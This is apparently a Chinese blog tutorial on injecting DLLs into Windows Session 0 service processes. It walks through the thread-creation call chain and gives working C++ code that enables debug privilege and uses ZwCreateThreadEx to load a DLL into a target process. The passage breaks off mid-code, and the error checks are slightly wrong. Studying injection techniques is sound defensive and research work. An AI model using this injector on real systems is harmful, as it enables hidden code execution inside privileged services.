<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611165720925.png" alt="image-20230611165720925"></p>
<h2 id="3-NtCreateThread"><a href="#3-NtCreateThread" class="headerlink" title="3.NtCreateThread"></a>3.NtCreateThread</h2><p><code>NtCreateThread</code>是内核级别的函数，它是属于NTDLL库中的一部分。NTDLL库中的函数主要是由操作系统的内核（即内核模式）使用的，而用户模式的程序一般不直接调用这些函数</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611170023100.png" alt="image-20230611170023100"></p>
<p><code>mov eax, 0C7h</code>：将值<code>0c7h</code>移动至eax寄存器，表示执行编号为<code>0c7h</code>的系统调用</p>
<p><code>syscall</code>：这是执行系统调用的指令。系统调用编号和参数应在此之前已被设置好（在这种情况下，通过将 <code>0xC7</code> 和 <code>rcx</code> 的内容移动到 <code>eax</code> 和 <code>r10</code>）</p>
<p>这段代码表示执行编号为 <code>0xC7</code> 的系统调用，如果 <code>ds:7FFE0308h</code> 的最低位被设置，那么在系统调用前会先跳转到另一段代码（位于 <code>loc_1800A0525</code>，使用<code>int 2Eh</code>中断进入内核）。如果该位未被设置，那么直接执行系统调用</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611170146936.png" alt="image-20230611170146936"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以下是<code>CreateRemoteThread</code>函数的调用流程图</p>
<ol>
<li>应用程序调用 <code>CreateRemoteThread</code>，这是一个由 <code>kernel32.dll</code> 提供的 Win32 API，用于在另一个进程的地址空间中创建新线程。</li>
<li><code>CreateRemoteThread</code> 内部调用 <code>CreateRemoteThreadEx</code>，这是一个由 <code>KernelBase.dll</code> 提供的更底层的 API，提供了更多的选项，比如可以指定安全描述符，可以控制新线程是否立即开始运行等</li>
<li><code>CreateRemoteThreadEx</code> 内部调用 <code>NtCreateThreadEx</code>，这是由 <code>ntdll.dll</code> 提供的 Native API，也是用户空间可以直接调用的最底层的 API。</li>
<li><code>NtCreateThreadEx</code> 函数设置好系统调用的参数后，执行 <code>syscall</code> 指令，切换到内核模式。</li>
<li>在内核模式下，根据 <code>syscall</code> 提供的系统调用编号，在 SSDT 表中查找对应的内核函数。</li>
<li>执行 SSDT 表中找到的函数，完成线程的创建。</li>
</ol>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611174832964.png" alt="image-20230611174832964">	</p>
<h1 id="普通线程和远程线程的区别"><a href="#普通线程和远程线程的区别" class="headerlink" title="普通线程和远程线程的区别"></a>普通线程和远程线程的区别</h1><p>可以看到普通线程函数<code>CreateThread</code>也调用了<code>CreateRemoteThread</code>函数，只不过其线程句柄参数的值为-1，而远程线程的句柄参数为一个具体的值</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611175907620.png" alt="image-20230611175907620"></p>
<h1 id="代码实现思路"><a href="#代码实现思路" class="headerlink" title="代码实现思路"></a>代码实现思路</h1><h2 id="1-ZwCreateThread函数的声明及定义"><a href="#1-ZwCreateThread函数的声明及定义" class="headerlink" title="1.ZwCreateThread函数的声明及定义"></a>1.<code>ZwCreateThread</code>函数的声明及定义</h2><p>当我们使用DLL注入系统服务的进程时会失败，失败的原因在于，当<code>CreateRemoteThread</code>函数尝试在Session 0隔离的系统服务进程中注入DLL时，它通过调用<code>ZwCreateThread</code>函数创建远程线程，其中第七个参数<code>CreateThreadFlags</code>被设置为1。这意味着创建的线程在完成后将被挂起，无法被恢复，因此导致注入失败。为了成功注入，需通过调用<code>ZwCreateThreadEx</code>函数将此参数修改为0。</p>
<p>以下是对<code>ZwCreateThreadEx</code>函数的描述：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ZwCreateThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PHANDLE ThreadHandle,  <span class="comment">//输出参数，新创建的线程的句柄。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN ACCESS_MASK DesiredAccess,  <span class="comment">//所需的访问权限标志，例如PROCESS_ALL_ACCESS代表全部权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID ObjectAttributes,  <span class="comment">//对象的属性，通常为NULL。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN HANDLE ProcessHandle,  <span class="comment">//所创建线程将要在其内运行的进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN PTHREAD_START_ROUTINE StartRoutine,  <span class="comment">//新线程的开始地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID Argument,  <span class="comment">//要传递给新线程的参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG CreateFlags,  <span class="comment">//要传递给新线程的参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//ZeroBits, StackSize, MaximumStackSize: 这些参数一般设置为0，表示使用默认的堆栈大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG_PTR ZeroBits,  </span></span></span><br><span class="line"><span class="params"><span class="function">    IN SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    </span></span></span><br><span class="line"><span class="params"><span class="function">    IN PPS_ATTRIBUTE_LIST AttributeList  <span class="comment">//用于传递更高级的线程属性，通常设置为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>由于<code>ZwCreateThread</code>函数未在官方文档中说明，所以我们需对<code>ZwCreateThread</code>函数进行声明：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<p>然后通过<code>GetProcAddress</code>函数来获取这个函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HMODULE hNtdllDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	Fn_ZwCreateThreadEx ZwCreateThreadEx = (Fn_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-提升进程权限"><a href="#2-提升进程权限" class="headerlink" title="2.提升进程权限"></a>2.提升进程权限</h2><p>如果要将dll注入至系统服务进程，还需提升当前进程的权限，以下是提权函数的代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 提权函数，启用调试特权</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hToken; <span class="comment">// 用于保存进程访问令牌的句柄</span></span><br><span class="line">	BOOL fOk = FALSE; <span class="comment">// 用于保存函数是否执行成功的状态</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取当前进程的访问令牌</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp; <span class="comment">// 用于保存特权信息的结构体</span></span><br><span class="line">		tp.PrivilegeCount = <span class="number">1</span>; <span class="comment">// 设置特权数量为1</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取“Debug Programs”特权的本地唯一标识符（LUID）</span></span><br><span class="line">		<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line"></span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED; <span class="comment">// 设置特权的属性为启用</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 调整访问令牌，启用“Debug Programs”特权</span></span><br><span class="line">		<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		fOk = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS); <span class="comment">// 检查是否成功启用特权</span></span><br><span class="line">		<span class="built_in">CloseHandle</span>(hToken); <span class="comment">// 关闭访问令牌的句柄</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fOk; <span class="comment">// 返回函数是否执行成功的状态</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-Session0注入函数"><a href="#3-Session0注入函数" class="headerlink" title="3.Session0注入函数"></a>3.Session0注入函数</h2><p>此函数的主要作用是在Session0中注入指定的DLL。其步骤包括提权、打开目标进程、在目标进程中分配内存并写入DLL路径、获取LoadLibraryA函数地址、获取ZwCreateThreadEx函数地址、在目标进程中创建线程运行LoadLibraryA函数，最后释放资源</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Session0Inject</span><span class="params">(DWORD pid, <span class="type">char</span>* dllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="built_in">EnableDebugPrivilege</span>();  <span class="comment">//提权</span></span><br><span class="line">	DWORD DllNameLength = <span class="built_in">strlen</span>(dllPath);  <span class="comment">//获取dll路径名的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查文件是否存在  注意:&lt;filesystem&gt;库需使用支持C++17或更高版本的编译器</span></span><br><span class="line">	<span class="keyword">if</span> (!std::filesystem::<span class="built_in">exists</span>(dllPath)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;指定的DLL文件不存在\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1 获取目的进程句柄</span></span><br><span class="line">	HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开进程失败: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2 为目的进程分配内存,用于存放Loadlibrary传入的参数,即dll的路径</span></span><br><span class="line">	VOID* paraAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, DllNameLength + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == paraAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;内存分配失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3 将DLL的路径写到目标进程的内存</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, paraAddr, dllPath, DllNameLength + <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;写入内存失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4 获取loadlibrary函数的地址</span></span><br><span class="line">	HMODULE LibHandle = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	FARPROC ProcAdd = <span class="built_in">GetProcAddress</span>(LibHandle, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ProcAdd)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取LoadLibraryA失败!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5 通过调用GetProcAddress函数来获取ZwCreateThreadEx函数的地址</span></span><br><span class="line">	HMODULE hNtdllDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	DWORD dwStatus;</span><br><span class="line">	HANDLE hRemoteThread; </span><br><span class="line">	Fn_ZwCreateThreadEx ZwCreateThreadEx = (Fn_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//6 使用获取到的ZwCreateThreadEx函数在目标进程中创建线程，运行LoadLibraryA函数，参数为DLL路径</span></span><br><span class="line">	dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)ProcAdd, paraAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThreadEx error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放dll</span></span><br><span class="line">	<span class="built_in">FreeLibrary</span>(hNtdllDll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;filesystem&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取进程ID的函数</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(<span class="type">const</span> std::wstring&amp; name)</span> </span>&#123;</span><br><span class="line">	DWORD pid = <span class="number">0</span>;</span><br><span class="line">	HANDLE snap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (snap != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		PROCESSENTRY32W entry = &#123; <span class="built_in">sizeof</span>(entry) &#125;;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">Process32FirstW</span>(snap, &amp;entry)) &#123;</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (std::<span class="built_in">wstring</span>(entry.szExeFile) == name) &#123;</span><br><span class="line">					pid = entry.th32ProcessID;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">while</span> (<span class="built_in">Process32NextW</span>(snap, &amp;entry));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(snap);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//提权函数，启用调试特权</span></span><br><span class="line"><span class="comment">//这个函数的主要作用是启用当前进程的“debug programs”特权，这个特权允许进程附加到其他进程并控制它们</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	</span><br><span class="line">	HANDLE hToken; <span class="comment">// 用于保存进程访问令牌的句柄</span></span><br><span class="line">	BOOL fOk = FALSE; <span class="comment">// 用于保存函数是否执行成功的状态</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取当前进程的访问令牌</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp; <span class="comment">// 用于保存特权信息的结构体</span></span><br><span class="line">		tp.PrivilegeCount = <span class="number">1</span>; <span class="comment">// 设置特权数量为1</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取“Debug Programs”特权的本地唯一标识符（LUID）</span></span><br><span class="line">		<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line"></span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED; <span class="comment">// 设置特权的属性为启用</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 调整访问令牌，启用“Debug Programs”特权</span></span><br><span class="line">		<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		fOk = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS); <span class="comment">// 检查是否成功启用特权</span></span><br><span class="line">		<span class="built_in">CloseHandle</span>(hToken); <span class="comment">// 关闭访问令牌的句柄</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fOk; <span class="comment">// 返回函数是否执行成功的状态</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Session0Inject</span><span class="params">(DWORD pid, <span class="type">char</span>* dllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="built_in">EnableDebugPrivilege</span>();  <span class="comment">//提权</span></span><br><span class="line">	DWORD DllNameLength = <span class="built_in">strlen</span>(dllPath);  <span class="comment">//获取dll路径名的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查文件是否存在  注意:&lt;filesystem&gt;库需使用支持C++17或更高版本的编译器</span></span><br><span class="line">	<span class="keyword">if</span> (!std::filesystem::<span class="built_in">exists</span>(dllPath)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;指定的DLL文件不存在\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1 获取目的进程句柄</span></span><br><span class="line">	HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开进程失败: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2 为目的进程分配内存,用于存放Loadlibrary传入的参数,即dll的路径</span></span><br><span class="line">	VOID* paraAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, DllNameLength + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == paraAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;内存分配失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3 将DLL的路径写到目标进程的内存</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, paraAddr, dllPath, DllNameLength + <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;写入内存失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4 获取loadlibrary函数的地址</span></span><br><span class="line">	HMODULE LibHandle = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	FARPROC ProcAdd = <span class="built_in">GetProcAddress</span>(LibHandle, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ProcAdd)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取LoadLibraryA失败!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5 通过调用GetProcAddress函数来获取ZwCreateThreadEx函数的地址</span></span><br><span class="line">	HMODULE hNtdllDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	DWORD dwStatus;</span><br><span class="line">	HANDLE hRemoteThread; </span><br><span class="line">	Fn_ZwCreateThreadEx ZwCreateThreadEx = (Fn_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//6 使用获取到的ZwCreateThreadEx函数在目标进程中创建线程，运行LoadLibraryA函数，参数为DLL路径</span></span><br><span class="line">	dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)ProcAdd, paraAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThreadEx error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放dll</span></span><br><span class="line">	<span class="built_in">FreeLibrary</span>(hNtdllDll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="comment">//atoi函数可将字符串转化为整数</span></span><br><span class="line">		BOOL bRet = <span 